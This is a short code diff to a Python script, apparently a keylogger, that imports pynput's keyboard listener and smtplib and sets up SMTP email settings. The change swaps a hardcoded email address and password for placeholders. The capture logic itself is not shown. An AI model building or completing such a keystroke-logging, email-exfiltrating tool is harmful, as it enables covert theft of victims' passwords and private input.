@@ -1,9 +1,9 @@
 from pynput import keyboard
 import smtplib,ssl
-sender_mail = "jiwak60077@geekjun.com"     # Replace user@domain.com with your email id (everywhere)
+sender_mail = "user@domain.com"     # Replace user@domain.com with your email id (everywhere)
 #prefer using your own email id for receiver's as well.
-receiver_mail = "jiwak60077@geekjun.com"  # Replace user@domain.com with your email id (everywhere)
-password = "jiwak60077@geekjun.com"              # Enter your Password here
+receiver_mail = "user@domain.com"  # Replace user@domain.com with your email id (everywhere)
+password = "your password"              # Enter your Password here
 port = 587
 message = """From: user@domain.com
 To: user@domain.com                         
